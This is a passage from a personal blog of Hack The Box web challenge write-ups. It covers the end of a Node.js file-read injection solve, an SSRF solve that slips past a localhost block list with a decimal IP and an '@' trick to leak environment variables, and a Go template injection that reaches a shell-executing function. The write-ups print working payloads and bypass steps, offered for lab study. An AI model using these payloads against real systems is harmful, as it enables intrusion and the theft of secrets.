<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211110904318.png" class="lazyload"></p>
<p>However it seems to return an object.</p>
<p>Modify the parameter for readFileSync to <code>utf8</code></p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'fs'</span>).<span class="title function_">readFileSync</span>(<span class="string">'../flag.txt'</span>,<span class="string">'utf8'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211111035521.png" class="lazyload"></p>
<h1 id="ProxyAsService-Easy"><a href="#ProxyAsService-Easy" class="headerlink" title="ProxyAsService  - Easy"></a>ProxyAsService  - Easy</h1><p><strong>app.py</strong></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">app.register_blueprint(proxy_api, url_prefix=<span class="string">'/'</span>)</span><br><span class="line">app.register_blueprint(debug, url_prefix=<span class="string">'/debug'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>2 route blueprint <code>proxy_api</code> and <code>debug</code></p>
<figure class="highlight elm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title">ip</span>:<span class="keyword">port</span>/(proxy_api)</span><br><span class="line">ip:<span class="keyword">port</span>/debug(debug)</span><br></pre></td></tr></tbody></table></figure>

<p><strong>route.py</strong></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> application.util <span class="keyword">import</span> is_from_localhost, proxy_req</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">SITE_NAME = <span class="string">'reddit.com'</span></span><br><span class="line"></span><br><span class="line">proxy_api = Blueprint(<span class="string">'proxy_api'</span>, __name__)</span><br><span class="line">debug     = Blueprint(<span class="string">'debug'</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">'/r/cats/'</span>,</span><br><span class="line">            <span class="string">'/r/catpictures'</span>,</span><br><span class="line">            <span class="string">'/r/catvideos/'</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'.proxy'</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f'http://<span class="subst">{SITE_NAME}</span><span class="subst">{url}</span>'</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br><span class="line"></span><br><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">'/environment'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = {</span><br><span class="line">        <span class="string">'Environment variables'</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">'Request headers'</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></tbody></table></figure>

<p>Break down into 2 parts.</p>
<p>in the default index route, if the <code>url</code> parameter is not provided in the request, it will be randomly assign a path to <code>reddits</code>.</p>
<p>If the <code>url</code> is set in parameter, it will access the url through the <code>proxy_req</code> function</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">'/r/cats/'</span>,</span><br><span class="line">            <span class="string">'/r/catpictures'</span>,</span><br><span class="line">            <span class="string">'/r/catvideos/'</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'.proxy'</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f'http://<span class="subst">{SITE_NAME}</span><span class="subst">{url}</span>'</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></tbody></table></figure>

<p><strong>utils.py</strong></p>
<p>In this <code>utils.py</code> states the restriction for <code>proxy_req</code> functions stated previously, it will check if the <code>url</code> parameter contains the restricted keywords in the <code>RESTIRCTED_URLS</code> list. It will then act as a proxy send a request and forward the response back to user.</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">RESTRICTED_URLS = [<span class="string">'localhost'</span>, <span class="string">'127.'</span>, <span class="string">'192.168.'</span>, <span class="string">'10.'</span>, <span class="string">'172.'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> restricted_url <span class="keyword">in</span> RESTRICTED_URLS:</span><br><span class="line">        <span class="keyword">if</span> restricted_url <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">'127.0.0.1'</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_req</span>(<span class="params">url</span>):    </span><br><span class="line">    method = request.method</span><br><span class="line">    headers =  {</span><br><span class="line">        key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> request.headers <span class="keyword">if</span> key.lower() <span class="keyword">in</span> [<span class="string">'x-csrf-token'</span>, <span class="string">'cookie'</span>, <span class="string">'referer'</span>]</span><br><span class="line">    }</span><br><span class="line">    data = request.get_data()</span><br><span class="line"></span><br><span class="line">    response = requests.request(</span><br><span class="line">        method,</span><br><span class="line">        url,</span><br><span class="line">        headers=headers,</span><br><span class="line">        data=data,</span><br><span class="line">        verify=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_safe_url(url) <span class="keyword">or</span> <span class="keyword">not</span> is_safe_url(response.url):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> response, headers</span><br></pre></td></tr></tbody></table></figure>

<p>From here, it clearly seems a <code>SSRF</code> challenge. But where is the flag?</p>
<p>Checking through the docker files, the flag is hiding in the environment variable. Which we can obtain through the second part of the debug endpoints</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">'/environment'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = {</span><br><span class="line">        <span class="string">'Environment variables'</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">'Request headers'</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></tbody></table></figure>

<p>It has to check if the request if is from localhost</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">'127.0.0.1'</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br></pre></td></tr></tbody></table></figure>

<p>Now the task seems clearer, we have to craft a SSRF attacks, targeted to the <code>/debug/environment</code> and leak the environment settings that contains the flag.</p>
<p>Firstly, we have to bypass the restriction of <code>RESTRICTED_LIST</code>, it can be easily bypass by using decimal to represent IP address. <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#localhost">Hacktrick</a> also provided other methods that represent <code>localhost</code></p>
<p>Secondly, we cannot directly input the url point to endpoint as it will embedded a <code>reddit</code> infront of our provided user input.</p>
<p>Therefore we can use @ to bypass that.</p>
<p>Therefore the full payload will be </p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></tbody></table></figure>

<p>The server side will interpreted as</p>
<figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=reddit<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></tbody></table></figure>

<p>However, one interesting thing is when I setup docker in my localhost.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211142253717.png" class="lazyload"></p>
<p>I am able to get the flag through the payload indicate the port to be 1337 (Which docker itself exposed to 1337)</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.17.0.1:1337</span>/?url=@<span class="number">2130706433</span>:<span class="number">1337</span>/debug/environment</span><br></pre></td></tr></tbody></table></figure>

<p>but to the real target, I have difficulties using the same port 32436.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231211142411053.png" class="lazyload"></p>
<p>Suspect it is a mapping of ports when expose to public IPs.</p>
<p>Therefore have to change the payload to port 1337</p>
<figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/159.65.24.125:32436/</span><span class="string">?u</span>rl=<span class="variable">@0</span>.<span class="number">0.0</span>.<span class="number">0</span><span class="symbol">:</span><span class="number">1337</span>/debug/environment</span><br></pre></td></tr></tbody></table></figure>


<h1 id="RenderQuest-Easy"><a href="#RenderQuest-Easy" class="headerlink" title="RenderQuest  - Easy"></a>RenderQuest  - Easy</h1><blockquote>
<p>You’ve found a website that lets you input remote templates for rendering. Your task is to exploit this system’s vulnerabilities to access and retrieve a hidden flag. Good luck!</p>
</blockquote>
<p>From the description it seems like a Server Side Template Injection.</p>
<p>In function <code>getTpl</code></p>
<p>It retrieve the page and render the page using html template.</p>
<p><a target="_blank" rel="noopener" href="https://pkg.go.dev/html/template">https://pkg.go.dev/html/template</a></p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p RequestData)</span></span> FetchServerInfo(command <span class="type">string</span>) <span class="type">string</span> {</span><br><span class="line">	out, err := exec.Command(<span class="string">"sh"</span>, <span class="string">"-c"</span>, command).Output()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		</span><br></pre></td></tr></tbody></table></figure>

<p>This function is able to execute system information. Finding a way to trigger this function.</p>
<p>It looks complicated, but we can always use chatGPT to spawn a sample html page with the go lang template.</p>
<figure class="highlight handlebars"><table><tbody><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- File name: index.tpl --&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sample Template<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a sample GoLang HTML template page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- Here, you can include Go template syntax to render dynamic content --&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Client IP: </span><span class="template-variable">{{<span class="name">.ClientIP</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>User Agent: </span><span class="template-variable">{{<span class="name">.ClientUA</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Hostname: </span><span class="template-variable">{{<span class="name">.ServerInfo.Hostname</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server OS: </span><span class="template-variable">{{<span class="name">.ServerInfo.OS</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Kernel Version: </span><span class="template-variable">{{<span class="name">.ServerInfo.KernelVersion</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Server Memory: </span><span class="template-variable">{{<span class="name">.ServerInfo.Memory</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Location Information:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>IP Version: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.IpVersion</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>IP Address: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.IpAddress</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Latitude: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Latitude</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Longitude: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Longitude</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Country Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CountryName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Country Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CountryCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Time Zone: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.TimeZone</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Zip Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.ZipCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>City Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.CityName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Region Name: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.RegionName</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Continent: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.Continent</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Continent Code: </span><span class="template-variable">{{<span class="name">.ClientIpInfo.ContinentCode</span>}}</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure>

<p>Using web hook, paste the html template into the response.</p>
<p>Great we can render the page.</p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224212844990.png" class="lazyload"></p>
<p>Next we can just edit to call the <code>FetchServerInfo</code> </p>
<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224223755102.png" class="lazyload"></p>
<p>and we got the result</p>
<figure class="highlight tap"><table><tbody><tr><td class="code"><pre><span class="line">total 10172</span><br><span class="line">drwxr-xr-x   <span class="number"> 1 </span>root     root         <span class="number"> 4096 </span>Dec<span class="number"> 17 </span>12:54 .</span><br><span class="line">drwxr-xr-x   <span class="number"> 1 </span>root     root         <span class="number"> 4096 </span>Dec<span class="number"> 17 </span>12:54 ..</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root         <span class="number"> 4786 </span>Sep<span class="number"> 11 </span>14:11 main.go</span><br><span class="line">-rwxr-xr-x   <span class="number"> 1 </span>root     root     <span class="number"> 10387927 </span>Dec<span class="number"> 17 </span>12:54 renderquest</span><br><span class="line">drwxr-xr-x   <span class="number"> 4 </span>root     root         <span class="number"> 4096 </span>Sep <span class="number"> 7 </span>23:12 static</span><br><span class="line">drwxr-xr-x   <span class="number"> 2 </span>root     root         <span class="number"> 4096 </span>Sep <span class="number"> 7 </span>23:12 templates</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231224224419354.png" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
	</div>
	

	<div class="article-tags">
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/1998/01/01/HTB-Web-Challenge/">Continue</a> 	
	</div>	
    
</article>

	
	

	
	
 
   <nav class="paginator">
    
        <a class="prev" href="/page/3/"> 
            <i class="iconfont icon-left"></i>
            Prev
        </a>
    

   <span class="page-number"> Page <strong>4</strong>, Posts <strong>30</strong>. </span>

    
  </nav> 

	

    <script type="text/x-mathjax-config">
        var post = document.getElementsByClassName("post")[0];  
        MathJax.Hub.Config({
            showProcessingMessages: false,
            messageStyle: "none",    
            tex2jax: {
                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
            },
            "HTML-CSS": {            
                showMathMenu: false
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
    </script>
    <style>.MathJax{outline:0;}</style>

    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
</div>
          </div> 
      </div>            
    
        <i id="toTop" class="iconfont icon-backtotop"></i>

  
    <div class="none" id="search">
    <div class="header">
        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
        
        <i id="search-cancel" class="iconfont icon-cancel"></i>
    </div>

    <div id="search-result" class="result"></div>
</div>
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
      

         
            

            <a class="mobile-menu-link" href="/">Home
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">Archives
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">Tags
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">About
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
            
         
      
</div>
        
    



     
    


<footer class="footer">
	<div class="inner">
		<div class="copyright">
			©
			
			2020 -
			
			2023
			Ikonw

			<br>
			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>
	</div>
</footer>   

    
<script src="/nayo.bundle.js"></script>
           
          
</body></html>